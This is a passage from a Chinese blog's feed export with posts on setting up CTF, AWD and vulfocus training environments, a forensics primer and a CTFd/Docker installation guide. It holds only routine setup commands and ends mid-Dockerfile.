<h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请务必保证该出能从 hub.docker.com 上拉取下来。</span></span><br><span class="line"><span class="comment"># 尽量使用能在 hub.docker.com 上查看到 Dockerfile，下载量高的官方认证镜像，推荐使用 https://github.com/DASCTF.</span></span><br><span class="line"><span class="keyword">FROM</span> ctftraining/base_image_nginx_php_73</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝源码到相应目录下。</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> src /var/www</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如需自定义 FLAG 请将自定义脚本覆盖到 /flag.sh</span></span><br><span class="line"><span class="comment"># COPY files/flag.sh /flag.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如需操作数据库请将 sql 文件拷贝到 /db.sql</span></span><br><span class="line"><span class="comment"># COPY files/db.sql /db.sql</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如有上传文件等操作请务必将权限设置正确！</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown -R www-data:www-data /var/www/html/ &amp;&amp; \</span></span><br><span class="line"><span class="bash">    mv /var/www/flag.sh / &amp;&amp; \</span></span><br><span class="line"><span class="bash">    chmod +x /flag.sh &amp;&amp; \</span></span><br><span class="line"><span class="bash">    dos2unix /flag.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如需静态 FLAG 请在此利用环境变量声明</span></span><br><span class="line"><span class="comment"># ENV DASFLAG=DASCTF&#123;flag_test&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请声明对外暴露端口</span></span><br><span class="line"><span class="comment"># EXPOSE 80</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接用集成镜像了，太猛了。这个镜像不需要暴露端口。DASCTF的镜像需要暴露端口。相关源码可以去github上搜ctftraining去看。</p>
<p>注意第18行<code>dos2unix /flag.sh</code>，个人习惯在windows上出题，写的shell脚本的换行符在linux系统中会炸，因此需要执行该命令。当然也可以使用编辑器，例如notepad++或sublime text中设置文件为unix格式。</p>
<h2 id="有数据库篇"><a href="#有数据库篇" class="headerlink" title="有数据库篇"></a>有数据库篇</h2><p>正在学习，玩不明白数据库，蕾姆。之后看情况更新密码nc题出题方法。</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>ctf出题指南</tag>
      </tags>
  </entry>
  <entry>
    <title>基于AWD-platform的AWD环境搭建</title>
    <url>/2021/09/27/%E5%9F%BA%E4%BA%8EAWD-platform%E7%9A%84AWD%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="基于AWD-platform的AWD环境搭建"><a href="#基于AWD-platform的AWD环境搭建" class="headerlink" title="基于AWD-platform的AWD环境搭建"></a>基于AWD-platform的AWD环境搭建</h1><p>用zhl2008大佬的平台搭了个AWD平台，下面记录搭建过程和运维指南。</p>
<span id="more"></span>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247486325&amp;idx=1&amp;sn=96c04f3609a04260eabdd187fc7c38b1&amp;chksm=fbf79105cc8018131579ad228dbf22a33bbdf0c8c71d3b8c090583b42ea21d80de53fc1efa70&amp;scene=27&amp;key=593393174013ce6d958e86eb764289b105cb7cea44d471bd3f9fe1a2ed76f546343dacb9b40a352e642e425b55c2a4d9698146a114ecd9680ed3262c8f96f6a206f0c78d6818ce0028c9bc75830936f0&amp;ascene=7&amp;uin=NTQ5ODg5NzY1&amp;devicetype=Windows+10&amp;version=6206061c&amp;lang=zh_CN&amp;pass_ticket=s3n8uD0SG7m1vojw%2F%2BN7uxdrTxvWnumzuUe%2BTLY12QY9yFKjU7n%2FNruWi9PS1sJO&amp;winzoom=1">夜莫离大佬的教程</a></p>
<p><a href="https://blog.csdn.net/huanghelouzi/article/details/90204325">搭建CTF-AWD训练平台</a></p>
<p><a href="https://www.moonsec.com/archives/2980">暗月博客搭建AWD平台</a></p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/jikemofan/awd-platform</span><br></pre></td></tr></table></figure>
<p>原版有无限提交flag的bug，我用的暗月的版本，主要bug均已经修复。（但是有新的bug，比如说他写的提交flag功能是个摆设）</p>
<p>进入项目：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd awd-platform/</span><br></pre></td></tr></table></figure>
<p>从网上拉取一下zhl2008的docker镜像：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull zhl2008&#x2F;web_14.04</span><br></pre></td></tr></table></figure>
<p>然后要改名！大坑。不改名就去改dockerfile</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker tag zhl2008&#x2F;web_14.04 web_14.04</span><br></pre></td></tr></table></figure>
<p>至此，awd平台已经安装完毕。但是，要安装python2，先更新源：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
<p>然后装python2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python2</span><br></pre></td></tr></table></figure>
<h2 id="比赛环境介绍"><a href="#比赛环境介绍" class="headerlink" title="比赛环境介绍"></a>比赛环境介绍</h2><p>服务器全部以docker形式部署在同一台虚拟机上。</p>
<p>Check_server:</p>
<p>服务检查服务器，用于判定选手维护的服务是否可用，如果不可用，则会扣除相应的分数。不开启任何端口。需要与flag服务器通信。</p>
<p>Flag_server:</p>
<p>选手提交flag的服务器，并存储选手的分数。开启80端口。</p>
<p>Web_server:</p>
<p>选手连接的服务器，选手需要对其进行维护，并尝试攻击其他队伍的机器。通常开启80端口，22端口，并将端口映射到主机。</p>
<h2 id="比赛逻辑拓扑"><a href="#比赛逻辑拓扑" class="headerlink" title="比赛逻辑拓扑"></a>比赛逻辑拓扑</h2><p><img src="https://i.loli.net/2021/09/27/nGrJePfA3XVLFgl.png" alt="7-1"></p>
<h2 id="比赛启动"><a href="#比赛启动" class="headerlink" title="比赛启动"></a>比赛启动</h2><p>例如我要创建5支队伍，赛题使用<code>web_yunnan_simple</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 batch.py web_yunnan_simple 5</span><br></pre></td></tr></table></figure>
<p>启动比赛：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 start.py ./ 5</span><br></pre></td></tr></table></figure>
<p>此时可以访问8080端口看到计分板。靶机也可以正常访问。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">映射规则:</span><br><span class="line">站的位置:</span><br><span class="line">team1 ---- 8801</span><br><span class="line">team2 ---- 8802</span><br><span class="line">team3 ---- 8803</span><br><span class="line">SSH位置:</span><br><span class="line">team1 ---- 2201</span><br><span class="line">team2 ---- 2202</span><br><span class="line">team3 ---- 2203</span><br></pre></td></tr></table></figure>
<p>各队伍的ssh密码在pass.txt中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat pass.txt</span><br></pre></td></tr></table></figure>
<p>关于check模块，他的check脚本是不能用的，我们需要进行一些修改，这个规则要根据自己的环镜自己编写，总体思路就是判断页面是否存在，存在就加一分，不存在就减一分，在他内置check脚本的基础上，我们可以稍微修改一下靶机环境的源码，然后用check脚本去访问，在他内置的脚本中还可以修改每次加分和扣分的多少。</p>
<p><img src="https://i.loli.net/2021/09/27/CyfMQIl7Sab8qci.png" alt="image-20210927210321320"></p>
<p>还有一个要注意的地方就是，在项目的根目录的flag_server/中，我们 要赋予score.txt 和result.txt 777权限，否则分数变动无法进行同步。</p>
<p>关闭环境和题目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 stop_clean.py</span><br></pre></td></tr></table></figure>
<h2 id="比赛参数"><a href="#比赛参数" class="headerlink" title="比赛参数"></a>比赛参数</h2><p>Flag 提交： /flag_file.php?token=teamx&amp;flag=xxxx (x为你们的队伍号)</p>
<h2 id="比赛规则"><a href="#比赛规则" class="headerlink" title="比赛规则"></a>比赛规则</h2><p>1.每个队伍分配到一个docker主机，给定ctf用户权限，通过制定的端口和密码进行连接；</p>
<p>2.每台docker主机上运行一个web服务或者其他的服务，需要选手保证其可用性，并尝试审计代码，攻击其他队伍；</p>
<p>3.比赛开始后，<strong>前30分钟</strong>，选手维护各自的主机，在这个阶段，所有的攻击和服务不可用不影响分数；</p>
<p>4.选手可以通过使用漏洞获取其他队伍的服务器的权限，读取他人服务器上的flag并提交到指定的flag服务器：</p>
<p><a href="http://flag服务器IP:端口/flag_file.php?token=队伍token&amp;flag=获取到的flag">http://flag服务器IP:端口/flag_file.php?token=队伍token&amp;flag=获取到的flag</a>   来获得相应的分数。</p>
<p>例如：flag server地址为8.8.8.8，端口为8080，队伍token为team1，flag为40ed892b93997142e46124516d0f5ac0，则请求/flag_file.php?token=team1&amp;flag=40ed892b93997142e46124516d0f5ac0来获得相应分数。</p>
<p>每次成功攻击可获得<strong>2</strong>分，被攻击者扣除2分；<strong>有效攻击两分钟一轮</strong>；</p>
<p>5.选手需要保证己方服务的可用性，每次服务不可用，扣除1分,服务可用，加1分；<strong>服务检测两分钟一轮</strong>；</p>
<p>6.选手可以从flag服务器上获取所有的攻击情况以及当前的分数：</p>
<p>攻击情况url地址：<a href="http://flag服务器IP:端口/result.txt">http://flag服务器IP:端口/result.txt</a></p>
<p>得分情况地址：<a href="http://flag服务器IP:端口/score.txt">http://flag服务器IP:端口/score.txt</a></p>
<p>7.<strong>不允许使用任何形式的DOS攻击</strong></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>比赛节奏巨快，2分钟一轮。要修改的话可以看看这个（但我没有成功）</p>
<p><img src="https://i.loli.net/2021/09/27/nZEoyXMVL8duckT.png" alt="image-20210927210717817"></p>
<p>还有夜莫离大佬写的前端计分板。</p>
<p><img src="https://i.loli.net/2021/09/27/f6mapx42HyUhjzq.png" alt="image-20210927210806037"></p>
<p>计分板源码打包：<a href="https://pan.baidu.com/s/18KlIeluaTtm-kT3KuXHseQ">https://pan.baidu.com/s/18KlIeluaTtm-kT3KuXHseQ</a></p>
<p>提取码：cvdn</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>AWD环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>vulfocus靶场搭建及bug处理</title>
    <url>/2021/09/27/vulforce%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E5%8F%8Abug%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h1 id="vulfocus搭建"><a href="#vulfocus搭建" class="headerlink" title="vulfocus搭建"></a>vulfocus搭建</h1><p>想复现漏洞，但是漏洞复现需要大家一起交流一起学习，就想到搭一个漏洞复现靶场。</p>
<span id="more"></span>
<p>首先贴上<a href="https://fofapro.github.io/vulfocus/#/">官方链接</a>：</p>
<p>推荐采用快速安装。自定义安装极其繁琐，把握不住。</p>
<h2 id="安装流程："><a href="#安装流程：" class="headerlink" title="安装流程："></a>安装流程：</h2><h3 id="拉取镜像："><a href="#拉取镜像：" class="headerlink" title="拉取镜像："></a>拉取镜像：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus&#x2F;vulfocus:latest</span><br></pre></td></tr></table></figure>
<h3 id="启动："><a href="#启动：" class="headerlink" title="启动："></a>启动：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock  -e VUL_IP&#x3D;xxx.xxx.xxx.xxx&quot; vulfocus&#x2F;vulfocus</span><br></pre></td></tr></table></figure>
<p>因为内网使用，就不开邮箱权限了。</p>
<p>贴上官网教程。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531690363-b2effeed-c6ce-4c2e-bfcb-067c59e6b224.png" alt="image-20210927200624470"></p>
<h2 id="bug处理"><a href="#bug处理" class="headerlink" title="bug处理"></a>bug处理</h2><h3 id="1、服务器内部异常，请联系管理员"><a href="#1、服务器内部异常，请联系管理员" class="headerlink" title="1、服务器内部异常，请联系管理员"></a>1、服务器内部异常，请联系管理员</h3><p>巨大bug，在拉取镜像后，点击首页会报这个错误，解决方式为进入镜像管理，点击右上角一键同步，即可。</p>
<h3 id="2、忘了长啥样，但是进去就得处理"><a href="#2、忘了长啥样，但是进去就得处理" class="headerlink" title="2、忘了长啥样，但是进去就得处理"></a>2、忘了长啥样，但是进去就得处理</h3><p>点击设置-系统设置，在分享一栏输入自己的github账号名。然后镜像没事别乱点分享，即可。</p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>靶场环境很大很大！之前随便下了10个靶场就占了将近10G的内存！合理分配好内存！</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>vulfocus搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>零基础入门电子数据取证</title>
    <url>/2021/08/28/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<h1 id="零基础入门电子数据取证"><a href="#零基础入门电子数据取证" class="headerlink" title="零基础入门电子数据取证"></a>零基础入门电子数据取证</h1><span id="more"></span>
<h2 id="电子数据基础"><a href="#电子数据基础" class="headerlink" title="电子数据基础"></a>电子数据基础</h2><h3 id="什么是电子数据"><a href="#什么是电子数据" class="headerlink" title="什么是电子数据"></a>什么是电子数据</h3><p>电子数据可以是人为生成、自动生成或者两者结合下生成的。</p>
<p>人为生成的电子数据是以用户的主观意志创造、复制或者衍生出的新数据，使用户主动创造的痕迹，一般不会特意清除。比如使用邮件客户端收发的邮件、通过下载工具下载资料等。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531728693-3863cf8a-1d5d-4f1c-87fe-872f89b37357.png" alt="image-20210828082739631"></p>
<p><img src="D:\study\blog\source\_posts\零基础入门电子数据取证\rw3tcqXW7zjZ8H4.png" alt="image-20210828082755764"></p>
<p>自动生成的电子数据是操作系统或者应用系统自动生成的记录一定信息的数据，不被用户的主观意志左右。通常这些数据是从系统启动开始，在用户不经意间不断产生的，而且会在用户的使用过程中随时变化，比如操作系统的开关机时间、USB设备的插拔记录、通过浏览器上网产生的缓存记录等。</p>
<h3 id="用户痕迹的特点"><a href="#用户痕迹的特点" class="headerlink" title="用户痕迹的特点"></a>用户痕迹的特点</h3><p>人为、自动和两者结合的方式产生的用户痕迹数据贯穿了使用计算机等设备的整个过程，也使得第三方调查者能够通过调查这些痕迹数据对嫌疑人进行用户行为串联和分析，从而给还原案件的真相提供了可能。</p>
<p>用户痕迹电子数据具备着电子数据的普遍特点：无形性、多样性、客观性、易破坏性、隐蔽性等。</p>
<p>由于痕迹产生于用户使用计算机等设备的过程中，因此还具备着记录用户操作历史、行为轨迹、通信记录、密码信息等隐私数据的特点。</p>
<h2 id="电子数据与电子数据取证"><a href="#电子数据与电子数据取证" class="headerlink" title="电子数据与电子数据取证"></a>电子数据与电子数据取证</h2>]]></content>
  </entry>
  <entry>
    <title>C语言学习笔记</title>
    <url>/2021/07/25/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="02c44a61c7098542a720ee37d99d397a007003ab382bd35646b6f8363970eb0b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFd+CTFd-whale安装教程</title>
    <url>/2021/07/11/CTFd+CTFd-whale%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="动态靶机CTF靶场平台搭建"><a href="#动态靶机CTF靶场平台搭建" class="headerlink" title="动态靶机CTF靶场平台搭建"></a>动态靶机CTF靶场平台搭建</h1><p>闲来无事，嫖了阿里云2个月试用机搭了一个训练靶场，在此记录详细过程。对应的是赵总博客的第一种模式：单机 Direct 模式</p>
<span id="more"></span>
<h2 id="换源-虚拟机调配时使用"><a href="#换源-虚拟机调配时使用" class="headerlink" title="换源(虚拟机调配时使用)"></a>换源(虚拟机调配时使用)</h2><p>Ubuntu系统中，软件源文件地址为：<code>/etc/apt/sources.list</code></p>
<p>1.备份原来的源，将以前的源备份一下，以防以后可以用的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>
<p>2.打开<code>/etc/apt/sources.list</code>文件，在前面添加如下条目，并保存。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#添加阿里源s</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">#添加清华源</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse multiverse</span><br></pre></td></tr></table></figure>
<p>3.更新</p>
<p>更新源</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<p>如出现依赖问题，解决方式如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo apt-get -f install</span><br></pre></td></tr></table></figure>
<p>更新软件：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>
<p>参考链接：<a href="https://zhuanlan.zhihu.com/p/142014944">Ubuntu20.04软件源更换</a></p>
<h2 id="安装Docker和Docker-Compose"><a href="#安装Docker和Docker-Compose" class="headerlink" title="安装Docker和Docker Compose"></a>安装Docker和Docker Compose</h2><p>本部分内容完全参考：<a href="https://hujiekang.top/2020/04/26/CTFd-conf/">CTFd平台搭建记录</a></p>
<h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><p>Docker使用阿里云镜像源安装：</p>
<p><a href="https://docs.docker.com/engine/install/ubuntu/">Ubuntu安装docker官网</a></p>
<h4 id="卸载老版本Docker："><a href="#卸载老版本Docker：" class="headerlink" title="卸载老版本Docker："></a>卸载老版本Docker：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>
<h4 id="更新软件"><a href="#更新软件" class="headerlink" title="更新软件"></a>更新软件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<h4 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br></pre></td></tr></table></figure>
<h4 id="添加GPG密钥"><a href="#添加GPG密钥" class="headerlink" title="添加GPG密钥"></a>添加GPG密钥</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
<h4 id="查看密钥是否添加成功"><a href="#查看密钥是否添加成功" class="headerlink" title="查看密钥是否添加成功"></a>查看密钥是否添加成功</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-key fingerprint 0EBFCD88</span><br></pre></td></tr></table></figure>
<p>若添加成功，会显示如下信息：</p>
<p><img src="https://i.loli.net/2021/07/22/sPKywfbAjIpiHJS.png" alt="img"></p>
<h4 id="添加阿里云的软件源"><a href="#添加阿里云的软件源" class="headerlink" title="添加阿里云的软件源"></a>添加阿里云的软件源</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure>
<p>若添加成功，则在<code>/etc/apt/sources.list</code>中可看见类似如下的记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb [arch&#x3D;amd64] http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu bionic stable</span><br></pre></td></tr></table></figure>
<h4 id="再次更新软件"><a href="#再次更新软件" class="headerlink" title="再次更新软件"></a>再次更新软件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<h4 id="安装最新版的docker-ce"><a href="#安装最新版的docker-ce" class="headerlink" title="安装最新版的docker-ce"></a>安装最新版的docker-ce</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
<p>安装完毕之后，通过<code>docker --version</code>来验证安装是否成功：</p>
<p><img src="https://hujiekang.top/images/uploads/big/bbdd287fc77a316f10f8e52c39c47da9.png" alt="img"></p>
<h4 id="启动Docker服务并设置为开机启动"><a href="#启动Docker服务并设置为开机启动" class="headerlink" title="启动Docker服务并设置为开机启动"></a>启动Docker服务并设置为开机启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure>
<h4 id="然后为Docker添加镜像加速"><a href="#然后为Docker添加镜像加速" class="headerlink" title="然后为Docker添加镜像加速"></a>然后为Docker添加镜像加速</h4><p>修改<code>/etc/docker/daemon.json</code>文件（若不存在则自行创建），加入如下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://hub-mirror.c.163.com/(地址)&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>里面更换为想要的镜像地址即可。下面有几个可选项：</p>
<blockquote>
<ul>
<li>阿里云容器镜像服务（使用自己的阿里云账户申请）：<a href="https://cr.console.aliyun.com/#/accelerator">https://cr.console.aliyun.com/#/accelerator</a></li>
<li>DaoCloud：<a href="https://www.daocloud.io/mirror">https://www.daocloud.io/mirror</a></li>
<li>网易：<a href="https://hub-mirror.c.163.com/">https://hub-mirror.c.163.com/</a></li>
</ul>
</blockquote>
<p>修改文件后，执行命令重启docker服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
<h3 id="安装Docker-compose"><a href="#安装Docker-compose" class="headerlink" title="安装Docker-compose"></a>安装Docker-compose</h3><p>接下来是安装Docker Compose。官方给的是从GitHub下载安装，依然速度很慢，所以采用DaoCloud的镜像源来安装。</p>
<h4 id="下载docker-compose"><a href="#下载docker-compose" class="headerlink" title="下载docker-compose"></a>下载docker-compose</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<h4 id="为其添加可执行权限"><a href="#为其添加可执行权限" class="headerlink" title="为其添加可执行权限"></a>为其添加可执行权限</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<h4 id="使用docker-compose-version验证安装："><a href="#使用docker-compose-version验证安装：" class="headerlink" title="使用docker-compose --version验证安装："></a>使用<code>docker-compose --version</code>验证安装：</h4><p><img src="https://hujiekang.top/images/uploads/big/5343f8893310644d336b9011120b39c2.png" alt="img"></p>
<h4 id="启用Docker-Swarm"><a href="#启用Docker-Swarm" class="headerlink" title="启用Docker Swarm"></a>启用Docker Swarm</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker swarm init  # 初始化</span><br><span class="line">docker node ls  # 查看节点ID</span><br><span class="line">docker node update --label-add name=linux-1 &lt;节点 ID&gt;  # 添加别名(一定要记住！)</span><br></pre></td></tr></table></figure>
<h2 id="安装CTFd-amp-CTFd-Whale"><a href="#安装CTFd-amp-CTFd-Whale" class="headerlink" title="安装CTFd&amp;CTFd-Whale"></a>安装CTFd&amp;CTFd-Whale</h2><h3 id="下载赵总仓库的CTFd源码"><a href="#下载赵总仓库的CTFd源码" class="headerlink" title="下载赵总仓库的CTFd源码"></a>下载赵总仓库的CTFd源码</h3><p>（是否需要回滚忘了。参考博主的版本为<strong><code>9d8981a9808078a0634b13e61190cec4556782e4</code></strong>，如有报错，可以回滚）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone -b single https://github.com/glzjin/CTFd.git</span><br><span class="line">cd CTFd</span><br></pre></td></tr></table></figure>
<h3 id="坑1："><a href="#坑1：" class="headerlink" title="坑1："></a>坑1：</h3><p>清华源将python2和python3分开来了，所以Dockerfile里要把python和python-dev改掉。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.7</span>-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /opt/CTFd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir -p /opt/CTFd /var/<span class="built_in">log</span>/CTFd /var/uploads</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed -i <span class="string">&#x27;s/dl-cdn.alpinelinux.org/mirror.tuna.tsinghua.edu.cn/g&#x27;</span> /etc/apk/repositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk add \</span></span><br><span class="line"><span class="bash">        python3 \</span></span><br><span class="line"><span class="bash">        python3-dev \</span></span><br><span class="line"><span class="bash">        linux-headers \</span></span><br><span class="line"><span class="bash">        libffi-dev \</span></span><br><span class="line"><span class="bash">        gcc \</span></span><br><span class="line"><span class="bash">        make \</span></span><br><span class="line"><span class="bash">        musl-dev \</span></span><br><span class="line"><span class="bash">        py-pip \</span></span><br><span class="line"><span class="bash">        mysql-client \</span></span><br><span class="line"><span class="bash">        git \</span></span><br><span class="line"><span class="bash">        openssl-dev</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . /opt/CTFd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com -r requirements.txt</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="keyword">for</span> d <span class="keyword">in</span> CTFd/plugins/*; <span class="keyword">do</span> \</span></span><br><span class="line"><span class="bash">      <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$d</span>/requirements.txt&quot;</span> ]; <span class="keyword">then</span> \</span></span><br><span class="line"><span class="bash">        pip install -i 